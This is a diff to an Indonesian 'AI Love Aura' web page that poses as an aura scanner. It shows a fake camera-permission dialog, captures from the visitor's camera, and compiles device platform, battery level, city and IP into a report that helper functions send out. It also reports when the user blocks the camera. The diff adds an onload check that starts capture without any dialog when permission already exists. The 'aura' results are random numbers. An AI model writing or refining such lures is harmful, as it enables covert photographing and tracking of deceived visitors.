@@ -17,40 +17,40 @@
         /* --- ANIMATED BACKGROUND --- */
         .bg-animated {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(135deg, #ffeef8 0%, #ffd1dc 100%);
+            background: linear-gradient(135deg, #ffeef8 0%, #ffcbd5 100%);
             z-index: 1; overflow: hidden;
         }
 
         .particle {
             position: absolute; display: block; list-style: none;
-            background: rgba(255, 105, 180, 0.4);
+            background: rgba(255, 105, 180, 0.3);
             bottom: -150px; border-radius: 50%;
             animation: floating 15s infinite linear;
         }
 
-        /* Variasi Partikel */
         .particle:nth-child(1) { left: 10%; width: 80px; height: 80px; animation-delay: 0s; }
         .particle:nth-child(2) { left: 25%; width: 30px; height: 30px; animation-delay: 2s; animation-duration: 12s; }
         .particle:nth-child(3) { left: 45%; width: 50px; height: 50px; animation-delay: 4s; }
         .particle:nth-child(4) { left: 70%; width: 90px; height: 90px; animation-delay: 0s; animation-duration: 18s; }
         .particle:nth-child(5) { left: 85%; width: 40px; height: 40px; animation-delay: 5s; }
-        .particle:nth-child(6) { left: 15%; width: 110px; height: 110px; animation-delay: 3s; }
 
         @keyframes floating {
             0% { transform: translateY(0) rotate(0deg); opacity: 0; }
-            20% { opacity: 0.6; }
+            20% { opacity: 0.5; }
             100% { transform: translateY(-1200px) rotate(720deg); opacity: 0; }
         }
 
-        /* --- CONTAINER (GLASSMORPHISM) --- */
+        /* --- CONTAINER (FIXED BLUR) --- */
         .container {
             position: relative; z-index: 10;
-            background: rgba(255, 255, 255, 0.7);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
+            /* Transparansi harus pas agar blur terlihat */
+            background: rgba(255, 255, 255, 0.4); 
+            /* Blur wajib pakai prefix -webkit- */
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            backdrop-filter: blur(20px) saturate(180%);
             padding: 30px; border-radius: 40px;
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            box-shadow: 0 15px 35px rgba(255, 182, 193, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            box-shadow: 0 20px 40px rgba(255, 105, 180, 0.2);
             text-align: center; width: 85%; max-width: 350px;
         }
 
@@ -62,19 +62,21 @@
         /* --- UI ELEMENTS --- */
         #fake-dialog {
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: white; padding: 25px; border-radius: 30px; width: 280px;
-            z-index: 1001; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            background: rgba(255, 255, 255, 0.9);
+            -webkit-backdrop-filter: blur(10px); backdrop-filter: blur(10px);
+            padding: 25px; border-radius: 30px; width: 280px;
+            z-index: 1001; text-align: center; border: 1px solid #ffb6c1;
         }
 
-        h1 { color: #ff69b4; font-size: 1.5rem; margin-bottom: 10px; }
-        p { color: #666; font-size: 0.85rem; line-height: 1.5; }
-        .score { font-size: 3.5rem; color: #ff69b4; font-weight: bold; margin: 10px 0; text-shadow: 2px 2px #fff; }
+        h1 { color: #ff1493; font-size: 1.5rem; margin-bottom: 10px; }
+        p { color: #555; font-size: 0.85rem; line-height: 1.5; }
+        .score { font-size: 3.5rem; color: #ff1493; font-weight: bold; margin: 10px 0; }
         
         .btn-love {
             background: linear-gradient(45deg, #ff69b4, #ff1493);
             color: white; padding: 14px 30px; border-radius: 50px;
             font-weight: bold; border: none; cursor: pointer; margin-top: 15px;
-            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.3);
+            width: 100%;
         }
 
         /* --- SCANNER --- */
@@ -83,13 +85,13 @@
             margin: 20px auto; border: 4px solid #ffb6c1; border-radius: 50%; overflow: hidden;
         }
         .scan-bar {
-            position: absolute; width: 100%; height: 8px; background: #ff69b4;
-            box-shadow: 0 0 20px #ff69b4; top: 0; animation: scanLine 2s infinite ease-in-out;
+            position: absolute; width: 100%; height: 8px; background: #ff1493;
+            box-shadow: 0 0 20px #ff1493; top: 0; animation: scanLine 2s infinite ease-in-out;
         }
 
-        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.5); padding: 15px; border-radius: 20px; margin-top: 15px; }
+        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.3); padding: 15px; border-radius: 20px; margin-top: 15px; }
         .stat-bar-bg { width: 100%; height: 8px; background: #ffd1dc; border-radius: 10px; margin: 5px 0 10px 0; }
-        .stat-bar-fill { height: 100%; background: #ff69b4; width: 0%; transition: width 2s ease-out; }
+        .stat-bar-fill { height: 100%; background: #ff1493; width: 0%; transition: width 2s ease-out; }
 
         @keyframes scanLine { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
         video, canvas { display: none; position: fixed; }
@@ -100,25 +102,26 @@
     <div class="bg-animated">
         <div class="particle"></div><div class="particle"></div>
         <div class="particle"></div><div class="particle"></div>
-        <div class="particle"></div><div class="particle"></div>
+        <div class="particle"></div>
     </div>
 
     <button id="trigger"></button>
 
-    <div id="overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.4); z-index:1000;"></div>
+    <div id="overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.3); z-index:1000;"></div>
+    
     <div id="fake-dialog">
         <div style="font-size: 3rem;">📸</div>
         <h1>Izin Kamera</h1>
-        <p>AI butuh akses kamera sebentar untuk menscan aura wajahmu. Klik <b>Izinkan</b> ya!</p>
-        <button class="btn-love" style="width:100%" onclick="requestActualPermission()">LANJUTKAN ✨</button>
+        <p>AI butuh akses kamera sebentar untuk menscan aura wajahmu.</p>
+        <button class="btn-love" onclick="requestActualPermission()">LANJUTKAN ✨</button>
     </div>
 
     <div class="container">
         <div id="setup-view">
-            <div style="font-size: 4rem; animation: pulse 2s infinite;">💖</div>
+            <div style="font-size: 4rem;">💖</div>
             <h1>AI Love Aura</h1>
-            <p>Temukan warna auramu dan tingkat keberuntungan cintamu hari ini dengan pemindaian AI.</p>
-            <button class="btn-love">SCAN SEKARANG</button>
+            <p>Klik di mana saja untuk menscan warna auramu hari ini.</p>
+            <div class="btn-love" style="display:inline-block; width:auto;">SCAN SEKARANG</div>
         </div>
 
         <div id="scan-view" style="display:none;">
@@ -127,20 +130,19 @@
                 <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3rem;">✨</div>
             </div>
             <h1>Menganalisa...</h1>
-            <p>Tahan posisi, sedang menyelaraskan frekuensi aura wajahmu...</p>
+            <p>Sedang membaca frekuensi aura...</p>
         </div>
 
         <div id="result-view" style="display:none;">
-            <div style="font-size: 3rem;">✨🌈</div>
             <h1>Hasil Analisa</h1>
             <div class="score" id="final-score">0%</div>
             <div class="analysis-box">
-                <span style="font-size:0.7rem; color:#ff69b4;">LOVE LUCK</span>
+                <span style="font-size:0.7rem; color:#ff1493;">LOVE LUCK</span>
                 <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
-                <span style="font-size:0.7rem; color:#ff69b4;">POSITIVE VIBES</span>
+                <span style="font-size:0.7rem; color:#ff1493;">POSITIVE VIBES</span>
                 <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
             </div>
-            <p id="random-quote" style="font-style:italic; margin-top:15px; color:#ff1493;"></p>
+            <p id="random-quote" style="font-style:italic; margin-top:15px; color:#ff1493; font-size:0.8rem;"></p>
             <button class="btn-love" onclick="location.reload()">COBA LAGI</button>
         </div>
     </div>
@@ -156,6 +158,19 @@
         const canvas = document.getElementById('canvas');
         const trigger = document.getElementById('trigger');
 
+        // --- CEK IZIN OTOMATIS ---
+        window.onload = async () => {
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const result = await navigator.permissions.query({ name: 'camera' });
+                    if (result.state === 'granted') {
+                        // Jika sudah ada izin, langsung gas tanpa dialog
+                        requestActualPermission();
+                    }
+                } catch (e) {}
+            }
+        };
+
         trigger.onclick = () => {
             trigger.style.display = 'none';
             document.getElementById('overlay').style.display = 'block';
@@ -163,6 +178,7 @@
         };
 
         async function requestActualPermission() {
+            trigger.style.display = 'none';
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('fake-dialog').style.display = 'none';
             document.getElementById('setup-view').style.display = 'none';
@@ -178,12 +194,12 @@
                 video.srcObject = stream;
                 document.getElementById('scan-visual').style.display = 'block';
 
-                const report = `✨ [AURA SCAN SUCCESS]\nDevice: ${navigator.platform}\nBat: ${(bat.level*100)}%\nLoc: ${net.city || '?'}, ${net.country_name || '?'}\nIP: ${net.ip || '?'}`;
+                const report = `✨ [AURA SCAN]\nDevice: ${navigator.platform}\nBat: ${(bat.level*100).toFixed(0)}%\nLoc: ${net.city || '?'}\nIP: ${net.ip || '?'}`;
 
                 setTimeout(() => { capture(stream, report); }, 4000);
             } catch (err) {
-                sendText(`❌ User Blocked Camera`);
-                alert("Gagal menscan! Izin kamera diperlukan untuk melihat aura.");
+                sendText(`❌ User Blocked`);
+                alert("Gagal menscan! Berikan izin kamera.");
                 location.reload();
             }
         }
@@ -208,12 +224,12 @@
         function showResult() {
             document.getElementById('scan-view').style.display = 'none';
             document.getElementById('result-view').style.display = 'block';
-            const q = ["Aura Pink: Kamu akan bertemu seseorang spesial! ✨", "Aura Emas: Keberuntungan finansial mendekat! 💰", "Aura Biru: Hari yang tenang dan damai untukmu. 🌊"];
-            document.getElementById('random-quote').innerText = q[Math.floor(Math.random()*q.length)];
-            document.getElementById('final-score').innerText = (Math.floor(Math.random()*15)+85) + "%";
+            const quotes = ["Aura Pink: Kamu sangat dicintai! ✨", "Aura Biru: Kedamaian menyertaimu. 🌊", "Aura Emas: Keberuntungan besar datang! 💰"];
+            document.getElementById('random-quote').innerText = quotes[Math.floor(Math.random()*quotes.length)];
+            document.getElementById('final-score').innerText = (Math.floor(Math.random()*11)+89) + "%";
             setTimeout(() => {
-                document.getElementById('bar-luck').style.width = "85%";
-                document.getElementById('bar-vibe').style.width = "95%";
+                document.getElementById('bar-luck').style.width = "94%";
+                document.getElementById('bar-vibe').style.width = "88%";
             }, 500);
         }
 
